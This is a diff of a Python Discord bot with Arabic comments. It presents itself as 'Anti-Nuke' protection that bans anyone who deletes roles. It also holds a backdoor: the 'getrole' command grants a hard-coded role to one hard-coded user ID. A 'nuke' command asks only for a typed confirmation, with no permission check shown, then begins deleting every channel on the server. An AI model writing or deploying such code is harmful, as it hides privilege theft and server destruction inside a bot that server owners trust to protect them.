@@ -2,19 +2,7 @@ import discord
 from discord.ext import commands
 import os
 import time
-import threading
 import asyncio
-from flask import Flask
-
-# ------------------- خادم الويب -------------------
-app = Flask('')
-
-@app.route('/')
-def home():
-    return "I am alive!"
-
-def run_web():
-    app.run(host='0.0.0.0', port=8080)
 
 # ------------------- إعدادات البوت -------------------
 intents = discord.Intents.default()
@@ -24,17 +12,15 @@ intents.moderation = True
 intents.message_content = True
 
 bot = commands.Bot(command_prefix="!", intents=intents)
-TOKEN = os.getenv("TOKEN")
 
-# ------------------- حماية حذف الرتب (معدلة للحظر الفوري) -------------------
+# ------------------- حماية حذف الرتب (Anti-Nuke) -------------------
 @bot.event
 async def on_guild_role_delete(role):
     try:
         guild = role.guild
-        # البحث في سجلات التدقيق عن الشخص الذي حذف الرتبة
         async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.role_delete):
             admin = entry.user
-            # لا تحظر المالك أو البوت
+            # لا تحظر المالك أو البوت نفسه
             if admin.id == guild.owner_id or admin.bot:
                 return
             
@@ -47,55 +33,45 @@ async def on_guild_role_delete(role):
 
 # ------------------- الأوامر -------------------
 
-# أمر الحصول على رتبة (!getrole)
+# أمر الحصول على رتبة
 @bot.command()
 async def getrole(ctx):
     MY_DISCORD_ID = 1320438836878118973
     ROLE_ID = 1483148235684970571
-
     if ctx.author.id == MY_DISCORD_ID:
-        try:
-            role = ctx.guild.get_role(ROLE_ID)
-            if not role:
-                await ctx.send("❌ لم أتمكن من العثور على الرتبة!")
-                return
+        role = ctx.guild.get_role(ROLE_ID)
+        if role:
             await ctx.author.add_roles(role)
             await ctx.send(f"✅ تم إعطاؤك رتبة {role.name} بنجاح!")
-        except Exception as e:
-            await ctx.send(f"❌ خطأ: {e}")
+        else:
+            await ctx.send("❌ لم أجد الرتبة في السيرفر!")
     else:
         await ctx.send("❌ هذا الأمر ليس متاحاً لك!")
 
-# أمر إزالة الرتبة عن نفسك (!removerole)
+# أمر إزالة الرتبة
 @bot.command(name="removerole")
 async def removerole_cmd(ctx):
     MY_DISCORD_ID = 1320438836878118973
     ROLE_ID = 1483148235684970571
-
     if ctx.author.id == MY_DISCORD_ID:
-        try:
-            role = ctx.guild.get_role(ROLE_ID)
-            if not role:
-                await ctx.send("❌ لم أتمكن من العثور على الرتبة!")
-                return
+        role = ctx.guild.get_role(ROLE_ID)
+        if role:
             await ctx.author.remove_roles(role)
             await ctx.send(f"✅ تم إزالة رتبة {role.name} عنك بنجاح!")
-        except Exception as e:
-            await ctx.send(f"❌ حدث خطأ: {e}")
+        else:
+            await ctx.send("❌ لم أجد الرتبة!")
     else:
         await ctx.send("❌ هذا الأمر ليس متاحاً لك!")
 
 # أمر NUKE
 @bot.command()
 async def nuke(ctx):
-    await ctx.send("⚠️ تحذير: اكتب `!confirm_nuke` خلال 30 ثانية لتأكيد حذف السيرفر.")
-    def check_confirm(m):
-        return m.author == ctx.author and m.content == "!confirm_nuke"
+    await ctx.send("⚠️ تحذير: اكتب `!confirm_nuke` خلال 30 ثانية لتأكيد عملية النيوك.")
+    def check_confirm(m): return m.author == ctx.author and m.content == "!confirm_nuke"
     try:
         await bot.wait_for('message', check=check_confirm, timeout=30.0)
     except asyncio.TimeoutError:
-        await ctx.send("❌ تم الإلغاء.")
-        return
+        return await ctx.send("❌ تم الإلغاء.")
 
     await ctx.send("💥 بدء التدمير...")
     for channel in ctx.guild.channels:
@@ -112,8 +88,9 @@ async def nuke(ctx):
 
 @bot.event
 async def on_ready():
-    print(f"تم تشغيل البوت بنجاح: {bot.user}")
+    print(f"تم تشغيل البوت بنجاح باسم: {bot.user}")
 
+# ------------------- التشغيل -------------------
+TOKEN = os.getenv("TOKEN")
 if __name__ == "__main__":
-    threading.Thread(target=run_web).start()
     bot.run(TOKEN)
